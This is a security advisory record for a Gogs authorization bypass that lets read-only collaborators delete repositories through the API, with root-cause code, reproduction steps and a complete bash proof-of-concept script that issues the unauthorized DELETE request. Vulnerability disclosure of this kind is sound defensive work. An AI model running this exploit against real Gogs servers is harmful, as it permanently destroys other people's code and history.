advisory_id: GHSA-rjv5-9px2-fqw6
datasource_id: github_osv_importer_v2/GHSA-rjv5-9px2-fqw6
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-rjv5-9px2-fqw6/GHSA-rjv5-9px2-fqw6.json
aliases:
  - CVE-2025-65852
summary: "Gogs has authorization bypass in repository deletion API\n### Summary\n\nThe DELETE\
  \ /api/v1/repos/:owner/:repo endpoint lacks necessary permission validation middleware. Consequently,\
  \ any user with read access (including read-only collaborators) can delete the entire repository.\n\
  \nThis vulnerability stems from the API route configuration only utilizing the repoAssignment()\
  \ middleware (which only verifies read access) without enforcing reqRepoOwner() or reqRepoAdmin().\n\
  \n### Details\n0. vulnerability location:\n\n- Vulnerable Endpoint：DELETE /api/v1/repos/:owner/:repo\n\
  - Routing configuration file: internal/route/api/v1/api.go (approximately line 253)\n- Function\
  \ handling file: internal/route/api/v1/repo/repo.go (approximately lines 320-338)\n\n1. Root\
  \ Cause Analysis\n\nCode Location 1: API Route Configuration (internal/route/api/v1/api.go\
  \ ~ line 253)\n\n```go\n// 当前的路由配置（存在漏洞）\nm.Delete(\"\", repo.Delete)  // 仅继承了外层的 repoAssignment()\
  \ 中间件\n```\n\nCode Location 2: Delete Function Implementation (internal/route/api/v1/repo/repo.go\
  \ ~ lines 320-338)\n```go\n// Delete 函数内部没有额外的权限检查\nfunc Delete(c *context.APIContext) {\n\
  \    // 直接执行删除操作，未验证用户是否为所有者\n    if err := models.DeleteRepository(c.User.ID, c.Repo.Repository.ID);\
  \ err != nil {\n        c.Error(500, \"DeleteRepository\", err)\n        return\n    }\n \
  \   c.Status(204)\n}\n```\n\n2. Missing Permission Check\nComparison with route configurations\
  \ for other sensitive operations:\n\n```go\n// Webhooks 管理（正确实现）\nm.Group(\"/hooks\", func()\
  \ {\n    m.Combo(\"\").\n        Get(repo.ListHooks).\n        Post(bind(api.CreateHookOption{}),\
  \ repo.CreateHook)\n}, reqRepoAdmin())  // ✅ 使用了权限中间件\n\n// 部署密钥管理（正确实现）\nm.Group(\"/keys\"\
  , func() {\n    m.Combo(\"\").\n        Get(repo.ListDeployKeys).\n        Post(bind(api.CreateKeyOption{}),\
  \ repo.CreateDeployKey)\n}, reqRepoAdmin())  // ✅ 使用了权限中间件\n\n// 删除仓库（漏洞）\nm.Delete(\"\",\
  \ repo.Delete)  // ❌ 没有使用权限中间件\n```\n3. Data Flow Path\n\n- API Request Path: DELETE /api/v1/repos/:owner/:repo\n\
  - Route Handling: The outer middleware repoAssignment() verifies that the user has read access\
  \ (Passed).\n- Execution: The system directly executes the repo.Delete() function.\n- Permission\
  \ Check: The reqRepoOwner() middleware check is missing.\n- Internal Validation: There is\
  \ no permission validation inside the Delete() function either.\n- Result: Any user with read\
  \ permission can delete the repository.\n\n\n### PoC\n\nPrerequisites\n\n- A running Gogs\
  \ instance.\n- The attacker's account is added as a collaborator to the target repository\
  \ (Read access is sufficient).\n- The attacker possesses a valid API access token.\n- The\
  \ target repository exists and is accessible.\n\n\U0001F4DC Test Steps (Bash)\n\n1. Verify\
  \ Gogs service is running\ncurl -I http://localhost:10880\n\n2. Create test accounts and repository\n\
  - Owner account: owner / owner123456\n- Read-only account: victim / victim123456\n- Test repository:\
  \ owner/delete-test\n<img width=\"1580\" height=\"832\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d1babac8-d952-4765-ba34-d4891c12b8db\"\
  \ />\n\n\n3. Add 'victim' as a read-only collaborator\nPerform this via the Web UI or API\n\
  <img width=\"1597\" height=\"725\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f76db1d4-9e45-4a97-af22-50db124ec4d0\"\
  \ />\n<img width=\"1597\" height=\"760\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f6ef3bd9-47d4-4202-bf10-2022be557f16\"\
  \ />\n\n\n\n4. Obtain API token for 'victim'\ncurl -X POST http://localhost:10880/api/v1/users/victim/tokens\
  \ \\\n  -u victim:victim123456 \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\"\
  :\"test-token\"}'\n\n5. Resource deleted\n<img width=\"1602\" height=\"483\" alt=\"image\"\
  \ src=\"https://github.com/user-attachments/assets/3e77aaaa-ffbc-4521-be4b-9a62f36499ff\"\
  \ />\nWeb UI：Target repository deletion successful\n<img width=\"1581\" height=\"853\" alt=\"\
  image\" src=\"https://github.com/user-attachments/assets/fbd6b4a4-c874-44f9-9b6e-765371eddcc7\"\
  \ />\n\n\n\U0001F4DC PoC Script\n\n```bash\n#!/bin/bash\n# Gogs 仓库删除授权绕过漏洞 PoC\n\n# ============\
  \ 配置信息 ============\nGOGS_URL=\"http://localhost:10880\"\nTARGET_REPO=\"owner/delete-test\"\
  \nVICTIM_TOKEN=\"your_victim_read_only_token_here\"\n\n# ============ 执行攻击 ============\n\
  echo \"========================================\"\necho \"Gogs 仓库删除授权绕过漏洞 PoC\"\necho \"========================================\"\
  \necho \"\"\necho \"目标仓库: $TARGET_REPO\"\necho \"攻击者权限: Read（只读）\"\necho \"预期行为: 403 Forbidden（应该被拒绝）\"\
  \necho \"\"\n\n# 步骤1：验证仓库存在\necho \"[步骤1] 验证目标仓库存在...\"\nREPO_CHECK=$(curl -s -o /dev/null\
  \ -w \"%{http_code}\" \\\n  -H \"Authorization: token $VICTIM_TOKEN\" \\\n  \"$GOGS_URL/api/v1/repos/$TARGET_REPO\"\
  )\n\nif [ \"$REPO_CHECK\" == \"200\" ]; then\n    echo \"✓ 仓库存在且可访问\"\nelse\n    echo \"✗\
  \ 仓库不存在或无权访问 (状态码: $REPO_CHECK)\"\n    exit 1\nfi\n\n# 步骤2：尝试删除仓库（漏洞利用）\necho \"\"\necho \"\
  [步骤2] 使用只读权限尝试删除仓库...\"\nDELETE_RESPONSE=$(curl -s -w \"\\nHTTP_CODE:%{http_code}\" \\\n \
  \ -X DELETE \\\n  -H \"Authorization: token $VICTIM_TOKEN\" \\\n  \"$GOGS_URL/api/v1/repos/$TARGET_REPO\"\
  )\n\nDELETE_CODE=$(echo \"$DELETE_RESPONSE\" | grep \"HTTP_CODE:\" | cut -d: -f2)\n\necho\
  \ \"实际状态码: $DELETE_CODE\"\necho \"\"\n\n# 步骤3：验证结果\nif [ \"$DELETE_CODE\" == \"204\" ] ||\
  \ [ \"$DELETE_CODE\" == \"200\" ]; then\n    echo \"========================================\"\
  \n    echo \"\U0001F534 漏洞确认：删除成功！\"\n    echo \"========================================\"\
  \n    echo \"\"\n    echo \"只读权限用户成功删除了仓库！\"\n    echo \"\"\n    \n    # 验证仓库是否真的被删除\n   \
  \ sleep 2\n    echo \"验证仓库是否真的被删除...\"\n    VERIFY_CHECK=$(curl -s -o /dev/null -w \"%{http_code}\"\
  \ \\\n      -H \"Authorization: token $VICTIM_TOKEN\" \\\n      \"$GOGS_URL/api/v1/repos/$TARGET_REPO\"\
  )\n    \n    if [ \"$VERIFY_CHECK\" == \"404\" ]; then\n        echo \"✗ 仓库已被完全删除（404 Not\
  \ Found）\"\n        echo \"\"\n        echo \"危害确认：\"\n        echo \"  - 仓库及所有数据永久丢失\"\n\
  \        echo \"  - 代码历史记录不可恢复\"\n        echo \"  - 这是一个 HIGH 级别的严重漏洞\"\n    else\n     \
  \   echo \"? 仓库状态未知 (状态码: $VERIFY_CHECK)\"\n    fi\n    \nelif [ \"$DELETE_CODE\" == \"403\"\
  \ ]; then\n    echo \"========================================\"\n    echo \"✅ 无漏洞：操作被正确拒绝\"\
  \n    echo \"========================================\"\n    echo \"\"\n    echo \"只读权限用户无法删除仓库，权限检查正常\"\
  \n    \nelse\n    echo \"========================================\"\n    echo \"⚠️  未预期的响应\"\
  \n    echo \"========================================\"\n    echo \"\"\n    echo \"状态码: $DELETE_CODE\"\
  \n    echo \"这可能表示 API 端点不存在或其他错误\"\nfi\n\necho \"\"\necho \"========================================\"\
  \necho \"PoC 执行完成\"\necho \"========================================\"\n```\n\n\n### Impact\n\
  Vulnerability Type: Broken Access Control (CWE-284)\n\nDescription: A critical authorization\
  \ bypass vulnerability exists in the Gogs API. The access control mechanism fails to properly\
  \ validate permissions for destructive operations.\n\nConsequences: An authenticated attacker\
  \ with low-level privileges (e.g., a collaborator with Read-Only access) can exploit this\
  \ vulnerability to issue unauthorized DELETE requests. This allows the attacker to permanently\
  \ delete entire repositories, resulting in the immediate loss of all source code, git history,\
  \ issues, and wiki documentation.\n\nSeverity: This vulnerability poses a critical risk to\
  \ data integrity and availability, potentially leading to irreversible data loss and significant\
  \ operational disruption for affected organizations.\n\nThe Core Risk: Privilege Escalation\
  \ & Data Destruction The most critical aspect of this vulnerability is the violation of the\
  \ Principle of Least Privilege. It allows a user with the lowest level of access (Read-Only)\
  \ to execute the most destructive action possible (Delete)."
impacted_packages: []
severities:
  - score: '5.7'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:P
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/02/GHSA-rjv5-9px2-fqw6/GHSA-rjv5-9px2-fqw6.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-284
references:
  - url: https://github.com/gogs/gogs
    reference_type:
    reference_id:
  - url: https://github.com/gogs/gogs/commit/961a79e8f9f2b3190ea804bcf635e4b43b123272
    reference_type:
    reference_id:
  - url: https://github.com/gogs/gogs/releases/tag/v0.13.4
    reference_type:
    reference_id:
  - url: https://github.com/gogs/gogs/security/advisories/GHSA-rjv5-9px2-fqw6
    reference_type:
    reference_id:
